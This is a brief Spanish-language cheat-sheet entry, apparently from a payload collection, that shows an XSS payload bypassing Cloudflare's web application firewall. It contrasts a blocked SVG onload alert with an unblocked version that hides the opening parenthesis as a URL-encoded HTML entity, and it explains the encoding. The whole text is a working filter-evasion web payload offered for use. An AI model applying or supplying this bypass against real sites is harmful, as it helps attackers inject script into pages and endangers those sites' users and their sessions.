# Xss payload para bypassear cloudflare usando HTML Entity.

# Bloqueado:
<svg onload=alert("")>

# No bloqueado:
<svg onload=alert%26%230000000040"")>

&# = %26%230000000040 = (

